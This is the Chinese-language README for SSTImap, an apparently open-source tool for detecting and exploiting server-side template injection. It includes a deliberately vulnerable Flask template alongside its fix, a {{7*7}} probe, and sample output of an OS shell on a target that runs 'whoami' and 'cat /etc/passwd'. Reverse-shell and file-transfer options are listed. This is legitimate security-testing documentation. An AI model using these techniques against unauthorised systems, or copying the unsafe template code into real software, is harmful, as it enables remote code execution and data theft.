SSTImap 简体中文版本
====================

[![版本 1.3](https://img.shields.io/badge/version-1.3-green.svg?logo=github)](https://github.com/vladko312/sstimap)
[![Python 3.14](https://img.shields.io/badge/python-3.14-blue.svg?logo=python)](https://www.python.org/downloads/release/python-3140/)
[![Python 3.6](https://img.shields.io/badge/python-3.6+-yellow.svg?logo=python)](https://www.python.org/downloads/release/python-360/)
[![GitHub](https://img.shields.io/github/license/vladko312/sstimap?color=green&logo=gnu)](https://www.gnu.org/licenses/gpl-3.0.txt)
[![GitHub 最后一次提交](https://img.shields.io/github/last-commit/vladko312/sstimap?color=green&logo=github)](https://github.com/vladko312/sstimap/commits/)
[![维护](https://img.shields.io/maintenance/yes/2026?logo=github)](https://github.com/vladko312/sstimap)

> 本项目基于[Tplmap](https://github.com/epinna/tplmap/).

SSTImap 是一款渗透测试软件，可以检查网站是否存在代码注入和服务器端模板注入漏洞并利用它们，从而提供对操作系统本身的访问权限。

该工具被开发用作 SSTI 检测和利用的交互式渗透测试工具，从而允许更高级的利用。可以在[此处]找到 SSTImap 的更多载荷（https://github.com/vladko312/extras).

载荷和技术来自：
- James Kettle 的 [服务器端模板注入：现代 Web 应用程序的 RCE][5]
- 其他公共研究 [\[1\]][1] [\[2\]][2] [\[8\]][8]
- 对 Tplmap 的贡献 [\[3\]][3] [\[4\]][4]
- 我自己的研究[\[9\]][9]

该工具能够利用一些代码上下文转义和盲注入场景。它还支持 Java、JavaScript、PHP、Python、Ruby 和通用非沙盒模板引擎中的类似 _eval()_ 的代码注入。

与 Tplmap 的主要区别
-----------------------

尽管该软件基于 Tplmap 的代码，但不提供向后兼容性。
- 添加了两项用于 SSTI 检测和利用的新技术
- 交互模式（“-i”）允许更轻松地利用和检测
- 简单的评估载荷作为载荷反射情况下的响应标记
- 为通用模板添加了新的载荷，以使用“--generic”测试所有上下文
- 使用“Eval_generic”模块进行通用评估模板注入检测
- 基本语言 _eval()_-like shell (`-x`) 或单个命令 (`-X`) 执行
- 文件盲上传现在支持MD5确认和文件存在检查
- 为更多模板添加了新的载荷并更新了许多现有的载荷
- 模块化插件结构，允许安装额外的插件
- 支持不同的 POST 数据类型
- 添加抓取和表单检测
- 添加到许多参数的简短版本
- 一些旧的命令行参数已更改，请检查“-h”以获取帮助
- 代码已更改以使用更新的 python 功能
- Burp Suite 扩展暂时删除，因为 _Jython_ 不支持 Python3

服务器端模板注入
------------------------------

这是一个使用 [Flask][6] 框架和 [Jinja2][7] 模板引擎用 Python 编写的简单网站的示例。它以不安全的方式集成了用户提供的变量“name”，因为它在渲染之前连接到模板字符串。

```python3
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route("/page")
def page():
    name = request.args.get('name', 'World')
    # SSTI VULNERABILITY:
    template = f"Hello, {name}!<br>\n" \
                "OS type: {{os}}"
    return render_template_string(template, os=os.name)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

这种使用模板的方式不仅会产生 XSS 漏洞，而且还允许攻击者注入将在服务器上执行的模板代码，从而导致 SSTI。

```
$ curl -g 'https://www.target.com/page?name=John'
Hello John!<br>
OS type: posix
$ curl -g 'https://www.target.com/page?name={{7*7}}'
Hello 49!<br>
OS type: posix
```

用户提供的输入应该通过渲染上下文以安全的方式引入：

```python3
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route("/page")
def page():
    name = request.args.get('name', 'World')
    template = "Hello, {{name}}!<br>\n" \
               "OS type: {{os}}"
    return render_template_string(template, name=name, os=os.name)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

预定模式
------------------

预定模式下的SSTImap与Tplmap非常相似。它能够检测和利用多个不同模板中的 SSTI 漏洞。

利用后，SSTImap 可以提供对代码评估、操作系统命令执行和文件系统操作的访问。

要检查 URL，您可以使用“-u”参数：

```
$ ./sstimap.py -u https://example.com/page?name=John

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║ _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.3.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program


[*] Testing if GET parameter 'name' is injectable   
[*] Smarty plugin is testing rendering with tag '*'
...
[*] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] SSTImap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code

[+] Rerun SSTImap providing one of the following options:
    --os-shell                   Prompt for an interactive operating system shell
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port
    --reverse-shell HOST PORT    Send a shell back to the attacker's port
    --upload LOCAL REMOTE        Upload files to the server
    --download REMOTE LOCAL      Download remote files
```

使用“--os-shell”选项在目标上启动伪终端。

```
$ ./sstimap.py -u https://example.com/page?name=John --os-shell

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║ _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.3.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program


[*] Testing if GET parameter 'name' is injectable
[*] Smarty plugin is testing rendering with tag '*'
...
[*] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] SSTImap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux $ whoami
root
posix-linux $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

要获取完整的选项列表，请使用“--help”参数。

交互模式
----------------

在交互模式下，使用命令与 SSTImap 进行交互。要进入交互模式，您可以使用“-i”参数。除有关利用载荷的参数外，所有其他参数都将用作设置的初始值。

一些命令用于更改测试运行之间的设置。要运行测试，必须通过初始“-u”参数或“url”命令提供目标 URL。之后，您可以使用“run”命令来检查 SSTI 的 URL。

如果发现 SSTI，则可以使用命令来启动漏洞利用。您可以获得与预定模式相同的利用能力，但您可以使用“Ctrl+C”来中止它们而不停止程序。

顺便说一句，测试结果在目标 url 更改之前一直有效，因此您可以轻松地在利用方法之间切换，而无需每次都运行检测测试。

要获取交互式命令的完整列表，请在交互模式下使用命令“help”。

支持的模板引擎
--------------------------

SSTImap 支持多个模板引擎和类似 eval() 的注入。

PR 中欢迎新的载荷。查看[提示](https://github.com/vladko312/extras#developing-plugins)以加快开发速度。

| Engine                                                                             | RCE | Tech | Language   | Type                                                   |
|------------------------------------------------------------------------------------|-----|------|------------|--------------------------------------------------------|
| Freemarker                                                                         | ✓   | REBT | Java       | Default                                                |
| Java 通用 EL 注入                                                         | ✓   | REBT | Java       | Default                                                |
| OGNL（对象图导航语言代码评估）                                  | ✓   | REBT | Java       | Default                                                |
| Velocity                                                                           | ✓   | REBT | Java       | Default                                                |
| Nunjucks                                                                           | ✓   | REBT | JavaScript | Default                                                |
| Velocity.js                                                                        | ✓   | REBT | JavaScript | Default                                                |
| JavaScript（代码评估）                                                             | ✓   | REBT | JavaScript | Default                                                |
| 基于 JavaScript 的通用模板                                                 | ✓   | REBT | JavaScript | Default                                                |
| Twig (>=1.41; >=2.10; >=3.0)                                                       | ✓   | REBT | PHP        | Default                                                |
| PHP（代码评估）                                                                    | ✓   | REBT | PHP        | Default                                                |
| 基于 PHP 的通用模板                                                        | ✓   | REBT | PHP        | Default                                                |
| Jinja2                                                                             | ✓   | REBT | Python     | Default                                                |
| Python（代码评估）                                                                 | ✓   | REBT | Python     | Default                                                |
| 基于Python的通用模板                                                     | ✓   | REBT | Python     | Default                                                |
| ERB                                                                                | ✓   | REBT | Ruby       | Default                                                |
| Slim                                                                               | ✓   | REBT | Ruby       | Default                                                |
| Ruby（代码评估）                                                                   | ✓   | REBT | Ruby       | Default                                                |
| 通用评估模板                                                       | ×   | Reb_ | *          | Default                                                |
| SpEL（Spring EL 代码评估）                                                         | ✓   | REBT | Java       | Generic                                                |
| doT                                                                                | ✓   | REBT | JavaScript | Generic                                                |
| EJS                                                                                | ✓   | REBT | JavaScript | Generic                                                |
| Marko                                                                              | ✓   | REBT | JavaScript | Generic                                                |
| Pug                                                                                | ✓   | REBT | JavaScript | Generic                                                |
| Smarty                                                                             | ✓   | REBT | PHP        | Generic                                                |
| Cheetah                                                                            | ✓   | REBT | Python     | Generic                                                |
| Mako                                                                               | ✓   | REBT | Python     | Generic                                                |
| Tornado                                                                            | ✓   | REBT | Python     | Generic                                                |
| 灰尘（<=dustjs-helpers@1.5.0）                                                     | ✓   | REBT | JavaScript | Legacy                                                 |
| Twig (<=1.19)                                                                      | ✓   | REBT | PHP        | Legacy                                                 |
| Templite                                                                           | ✓   | REBT | Python     | Legacy                                                 |
| SSI（服务器端包括注入）                                               | ✓   | R__T | SSI        | Legacy                                                 |
| [CVE-2025-1302](https://gist.github.com/nickcopi/11ba3cb4fdee6f89e02e6afae8db6456) | ✓   | REBT | JavaScript | [额外](https://github.com/vladko312/extras/tree/main) |
| [CVE-2025-13204](https://huntr.com/bounties/1-npm-expr-eval)                       | ✓   | REBT | JavaScript | [额外](https://github.com/vladko312/extras/tree/main) |
| [CVE-2022-23614](https://nvd.nist.gov/vuln/detail/CVE-2022-23614)                  | ✓   | REBT | PHP        | [额外](https://github.com/vladko312/extras/tree/main) |
| [CVE-2024-6386](https://sec.stealthcopter.com/wpml-rce-via-twig-ssti/)             | ✓   | REBT | PHP        | [额外](https://github.com/vladko312/extras/tree/main) |

技术：(R)渲染、(E)基于错误、(B)基于错误的盲法和(T)基于时间的盲法；小写字母标记部分支持的技术

更多插件和载荷可以在[SSTImap Extra Plugins]（https://github.com/vladko312/extras) 存储库）中找到。

Burp 套件插件
-----------------

目前，Burp Suite 仅适用于 Jython 作为执行 python2 的方式。不提供Python3 功能。

未来计划
------------

如果您计划从这个列表中贡献一些大的东西，请告诉我避免与我或其他贡献者做同样的事情。

- [ ] 为不同引擎添加更多载荷
- [ ] 减少插件对基础插件的依赖
- [ ] 从文件中解析原始 HTTP 请求
- [ ] 变量转储功能
- [ ] 盲/侧通道价值提取
- [ ] 更好的文档（或至少任何文档）
- [ ] 短参数作为交互式命令？
- [ ] 用于脚本集成的 JSONL/纯文本 API 模式？
- [ ] 更好地集成 Python 脚本
- [ ] 多部分 POST 数据类型支持
- [ ] 用于更多可定制请求的模块（二阶、重置、非 HTTP）
- [ ] 负载处理脚本
- [ ] 更好的配置功能
- [ ] 保存发现的漏洞
- [ ] HTML 或其他格式的报告
- [ ] 多行语言评估？
- [ ] 避免载荷中的平台依赖性
- [ ] 在基于 exec 的 RCE 场景中测试多个 shell
- [ ] 更新 NodeJS 载荷，因为 process.mainModule 可能未定义
- [x] 蜘蛛/爬行器自动化（作者：[fantesykikachu](https://github.com/fantesykikachu))
- [x] 自动导入语言和引擎
- [x] 更多POST数据类型支持
- [x] 使模板和基础语言评估功能更加统一
- [x] 删除转义码的论点？

[1]: https://artsploit.blogspot.co.uk/2016/08/pprce2.html
[2]: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/
[3]: https://github.com/epinna/tplmap/issues/9
[4]: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
[5]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
[6]: http://flask.pocoo.org/
[7]: http://jinja.pocoo.org/
[8]: https://gist.github.com/n1nj4sec/5e3fffdfa322f4c23053359fc8100ab9
[9]: https://github.com/vladko312/Research_Successful_Errors
